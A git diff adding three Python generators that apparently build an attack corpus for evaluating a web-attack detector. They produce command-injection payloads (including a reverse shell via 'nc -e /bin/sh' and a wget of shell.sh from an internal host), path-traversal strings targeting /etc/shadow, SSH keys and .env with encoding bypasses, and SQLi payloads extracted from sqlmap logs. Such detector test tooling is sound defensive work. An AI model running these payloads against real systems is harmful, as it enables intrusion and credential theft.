+++ b/attack-sim/generators/cmdi_gen.py
@@ -0,0 +1,123 @@
+"""Own command-injection payload generator for POST /admin/ping (host
+field), independent of the SecLists Fuzzing/command-injection-commix.txt
+set used in training (that source's cmdi branch is exactly what leaked into
+the first evaluation corpus - see docs/config3b-results.md).
+
+The vulnerable code is:
+    exec(`ping -c 3 ${host}`, ...)
+
+Structurally, this generator deliberately does NOT use commix's own style
+(a random 6-letter canary + arithmetic identity check wrapped in a
+sleep-based timing template, e.g.
+`str=$(echo CANARY); str1=${#str}; if [ N -ne ${str1} ]; then sleep 0; else
+sleep 1; fi`). Instead it builds conventional, directly-legible attacker
+payloads: shell metacharacter separators / substitution operators around a
+fixed set of realistic post-exploitation commands. This keeps the
+underlying "shape" (after the same CANARY/N normalization used by
+training/parsers/parse_seclists_cmdi.py) structurally distinct from the
+SecLists corpus, which the exclusion filter also verifies directly
+(template-shape check against the raw SecLists file).
+
+Deterministic: same `seed` -> same output list, same order.
+"""
+from __future__ import annotations
+
+import random
+import urllib.parse
+
+HOST = "127.0.0.1"
+
+# Shell separators used to chain a second command after the legitimate
+# `ping` invocation, or to substitute output inline.
+SEPARATORS = [
+    ";", "|", "||", "&&", "&",
+    "\n", "%0a",
+    "%3b", "%7c", "%26%26", "%26",
+    ";;", "|&",
+]
+
+# Command substitution / subshell wrappers (payload = HOST + wrapper(cmd)).
+SUBSTITUTIONS = [
+    lambda cmd: f"`{cmd}`",
+    lambda cmd: f"$({cmd})",
+    lambda cmd: f";$({cmd})",
+    lambda cmd: f"|`{cmd}`",
+]
+
+COMMANDS = [
+    "cat /etc/passwd",
+    "cat /etc/shadow",
+    "whoami",
+    "id",
+    "uname -a",
+    "ls -la /",
+    "cat /proc/version",
+    "cat /app/.env",
+    "curl http://169.254.169.254/latest/meta-data/",
+    "wget http://10.0.0.1/shell.sh -O /tmp/s.sh",
+    "nc -e /bin/sh 10.0.0.1 4444",
+    "sleep 5",
+    "sleep 10",
+    "echo LSG_CMDI_MARKER",
+    "printenv",
+    "hostname",
+    "type C:\\Windows\\win.ini",
+    "dir C:\\",
+    "net user",
+    "powershell -c whoami",
+]
+
+COMMENT_SUFFIXES = ["", " #", " //", " %23"]
+
+
+def _separator_payloads() -> list[str]:
+    out = []
+    for sep in SEPARATORS:
+        for cmd in COMMANDS:
+            for suffix in COMMENT_SUFFIXES:
+                out.append(f"{HOST}{sep}{cmd}{suffix}")
+    return out
+
+
+def _substitution_payloads() -> list[str]:
+    out = []
+    for wrap in SUBSTITUTIONS:
+        for cmd in COMMANDS:
+            out.append(HOST + wrap(cmd))
+    return out
+
+
+def _url_encoded_variant(payload: str) -> str:
+    return urllib.parse.quote(payload, safe="")
+
+
+def generate(seed: int, count: int) -> list[str]:
+    rng = random.Random(seed)
+
+    candidates = _separator_payloads() + _substitution_payloads()
+    # Add a URL-encoded rendering of a deterministic sample of the plain
+    # candidates too, for encoding diversity (a real client submitting an
+    # HTML form would urlencode the body anyway, but sqlmap/curl style
+    # manual attackers sometimes pre-encode to dodge naive filters).
+    encoded_sample = rng.sample(candidates, k=min(80, len(candidates)))
+    candidates += [_url_encoded_variant(p) for p in encoded_sample]
+
+    rng.shuffle(candidates)
+
+    out: list[str] = []
+    seen: set[str] = set()
+    for p in candidates:
+        if p in seen:
+            continue
+        seen.add(p)
+        out.append(p)
+        if len(out) >= count:
+            break
+    return out
+
+
+if __name__ == "__main__":
+    payloads = generate(seed=20260923, count=200)
+    print(len(payloads))
+    for p in payloads[:15]:
+        print(" ", repr(p))
diff --git a/attack-sim/generators/path_traversal_gen.py b/attack-sim/generators/path_traversal_gen.py
new file mode 100644
index 0000000..02c6e2b
--- /dev/null
+++ b/attack-sim/generators/path_traversal_gen.py
@@ -0,0 +1,141 @@
+"""Own path-traversal payload generator for GET /posts/1/attachment?file=.
+
+The route does:
+    const filePath = path.join(UPLOAD_DIR, file);
+    fs.readFile(filePath, ...)
+
+`path.join` normalizes ".." segments but does not confine the result to
+UPLOAD_DIR - traversal depth just needs to be >= the depth of UPLOAD_DIR
+(2 for /app/uploads: `app`, `uploads`) for the extra ".." segments to walk
+past root and the remainder to resolve as an absolute path. Payloads here
+vary traversal depth and encoding around that mechanism, targeting a mix of
+Linux/proc/app-specific/Windows files for pattern diversity.
+
+Deterministic: same `seed` -> same output list, same order.
+"""
+from __future__ import annotations
+
+import random
+import urllib.parse
+
+TARGET_FILES = [
+    # Linux system files
+    "etc/passwd",
+    "etc/shadow",
+    "etc/hosts",
+    "etc/group",
+    "etc/hostname",
+    "etc/resolv.conf",
+    "etc/ssh/sshd_config",
+    "etc/crontab",
+    "proc/self/environ",
+    "proc/self/cmdline",
+    "proc/version",
+    "proc/self/status",
+    "root/.bash_history",
+    "root/.ssh/id_rsa",
+    "root/.ssh/authorized_keys",
+    "home/node/.bash_history",
+    "var/log/auth.log",
+    "var/log/syslog",
+    # App-specific (this repo's own layout, from docker-compose.yml/Dockerfile)
+    "app/.env",
+    "app/package.json",
+    "app/src/db.js",
+    "app/src/app.js",
+    "app/docker-compose.yml",
+    "app/node_modules/.package-lock.json",
+    # Windows targets (cross-platform pattern coverage even though the
+    # target container is Linux - detection should still fire on the
+    # traversal+target pattern itself)
+    "windows/win.ini",
+    "windows/system32/drivers/etc/hosts",
+    "boot.ini",
+    "inetpub/wwwroot/web.config",
+]
+
+DEPTHS = [2, 3, 4, 5, 6, 8, 10, 12]
+
+
+def _raw(depth: int, target: str) -> str:
+    return ("../" * depth) + target
+
+
+def _backslash(depth: int, target: str) -> str:
+    return ("..\\" * depth) + target.replace("/", "\\")
+
+
+def _url_single_encoded(depth: int, target: str) -> str:
+    return ("%2e%2e%2f" * depth) + urllib.parse.quote(target, safe="")
+
+
+def _url_double_encoded(depth: int, target: str) -> str:
+    return ("%252e%252e%252f" * depth) + target
+
+
+def _mixed_case_encoded(depth: int, target: str) -> str:
+    return ("%2E%2e%2F" * depth) + target
+
+
+def _overlong_utf8(depth: int, target: str) -> str:
+    return ("%c0%ae%c0%ae%c0%af" * depth) + target
+
+
+def _dot_dot_bypass(depth: int, target: str) -> str:
+    # Defeats a naive single-pass "../" -> "" filter: "....//" collapses to
+    # "../" if only one occurrence of "../" is stripped.
+    return ("....//" * depth) + target
+
+
+def _null_byte_suffix(depth: int, target: str) -> str:
+    return ("../" * depth) + target + "%00"
+
+
+def _absolute_no_traversal(depth: int, target: str) -> str:
+    # Not an actual escape via path.join (kept for detector-signal
+    # diversity: bare absolute-looking path with no traversal chain,
+    # distinguishable from the working exploit variants above).
+    return "/" + target
+
+
+ENCODERS = [
+    _raw,
+    _backslash,
+    _url_single_encoded,
+    _url_double_encoded,
+    _mixed_case_encoded,
+    _overlong_utf8,
+    _dot_dot_bypass,
+    _null_byte_suffix,
+    _absolute_no_traversal,
+]
+
+
+def generate(seed: int, count: int) -> list[str]:
+    rng = random.Random(seed)
+    combos = [
+        (target, depth, encoder)
+        for target in TARGET_FILES
+        for depth in DEPTHS
+        for encoder in ENCODERS
+    ]
+    rng.shuffle(combos)
+
+    out: list[str] = []
+    seen: set[str] = set()
+    for target, depth, encoder in combos:
+        payload = encoder(depth, target)
+        if payload in seen:
+            continue
+        seen.add(payload)
+        out.append(payload)
+        if len(out) >= count:
+            break
+    return out
+
+
+if __name__ == "__main__":
+    payloads = generate(seed=20260923, count=250)
+    print(len(payloads))
+    for p in payloads[:15]:
+        print(" ", p)
diff --git a/attack-sim/generators/sqlmap_extract.py b/attack-sim/generators/sqlmap_extract.py
new file mode 100644
index 0000000..7b6058d
--- /dev/null
+++ b/attack-sim/generators/sqlmap_extract.py
@@ -0,0 +1,110 @@
+"""Extracts candidate SQLi payloads from sqlmap traffic-log files (`-t`
+option). sqlmap doesn't have a "dump payloads" mode, so the traffic file
+(every raw HTTP request it sent) is the source of truth for what it tried.
+
+Two traffic logs are expected, one per target in Table 14 of the protocol:
+  - GET /posts/search?q=  -> attack-sim/sqlmap_out/traffic_search.txt
+  - POST /login (username) -> attack-sim/sqlmap_out/traffic_login.txt
+
+Only the payload actually placed in the targeted parameter is extracted
+(the `q` query param for /posts/search, the `username` body param for
+/login) - sqlmap also probes User-Agent/Referer/Cookie and injects
+distractor extra query params (e.g. `&apca=...`) while testing, which are
+not what we want as *the* candidate payload for that request spec.
+"""
+from __future__ import annotations
+
+import re
+import urllib.parse
+from pathlib import Path
+
+# Dynamism-probe / literal values sqlmap sends that carry no injection
+# syntax (used to confirm the parameter is reflected/dynamic before trying
+# real payloads). These are not attack payloads and are dropped.
+_TRIVIAL_RE = re.compile(r"^[A-Za-z0-9_\-]{0,12}$")
+
+# Heuristic: something that actually looks like an injection attempt -
+# quotes, SQL keywords/operators, comment sequences, or boolean/UNION/time
+# based syntax.
+_SQLI_SIGNAL_RE = re.compile(
+    r"""('|"|--|/\*|\bAND\b|\bOR\b|\bUNION\b|\bSELECT\b|\bSLEEP\b|\bBENCHMARK\b|
+        \bWAITFOR\b|\bCASE\b|\bEXTRACTVALUE\b|\bCAST\b|\bCONVERT\b|
+        information_schema|xp_cmdshell|\bEXEC\b|;|\bORDER\ BY\b|\bGROUP\ BY\b)""",
+    re.IGNORECASE | re.VERBOSE,
+)
+
+
+def _is_attack_shaped(payload: str) -> bool:
+    if not payload:
+        return False
+    if _TRIVIAL_RE.match(payload):
+        return False
+    return bool(_SQLI_SIGNAL_RE.search(payload))
+
+
+def extract_search_q_payloads(traffic_file: Path) -> list[str]:
+    """GET /posts/search?q=<payload>[&...] request lines."""
+    payloads: list[str] = []
+    seen: set[str] = set()
+    line_re = re.compile(r"^GET /posts/search\?(\S+) HTTP/1\.1")
+    with open(traffic_file, encoding="utf-8", errors="replace") as fh:
+        for line in fh:
+            m = line_re.match(line)
+            if not m:
+                continue
+            qs = urllib.parse.parse_qs(m.group(1), keep_blank_values=True)
+            if "q" not in qs or not qs["q"]:
+                continue
+            payload = qs["q"][0]
+            if not _is_attack_shaped(payload):
+                continue
+            if payload not in seen:
+                seen.add(payload)
+                payloads.append(payload)
+    return payloads
+
+
+def extract_login_username_payloads(traffic_file: Path) -> list[str]:
+    """POST /login body: username=<payload>&password=... request lines.
+
+    The traffic file interleaves request/response blocks; the body is the
+    first blank-line-terminated line after the request headers for POST
+    requests. We scan for lines shaped like `username=...&password=...`
+    directly, which is simpler and robust to header-order changes.
+    """
+    payloads: list[str] = []
+    seen: set[str] = set()
+    body_re = re.compile(r"^username=([^&\n]*)&password=")
+    with open(traffic_file, encoding="utf-8", errors="replace") as fh:
+        for line in fh:
+            m = body_re.match(line)
+            if not m:
+                continue
+            payload = urllib.parse.unquote_plus(m.group(1))
+            if not _is_attack_shaped(payload):
+                continue
+            if payload not in seen:
+                seen.add(payload)
+                payloads.append(payload)
+    return payloads
+
+
+def extract_all(sqlmap_out_dir: Path) -> dict[str, list[str]]:
+    search_file = sqlmap_out_dir / "traffic_search.txt"
+    login_file = sqlmap_out_dir / "traffic_login.txt"
+    result: dict[str, list[str]] = {"search_q": [], "login_username": []}
+    if search_file.exists():
+        result["search_q"] = extract_search_q_payloads(search_file)
+    if login_file.exists():
+        result["login_username"] = extract_login_username_payloads(login_file)
+    return result
+
+
+if __name__ == "__main__":
+    out = extract_all(Path(__file__).parent.parent / "sqlmap_out")
+    print(f"search_q: {len(out['search_q'])} candidates")
+    for p in out["search_q"][:10]:
+        print("  ", repr(p))
+    print(f"login_username: {len(out['login_username'])} candidates")
+    for p in out["login_username"][:10]:
+        print("  ", repr(p))
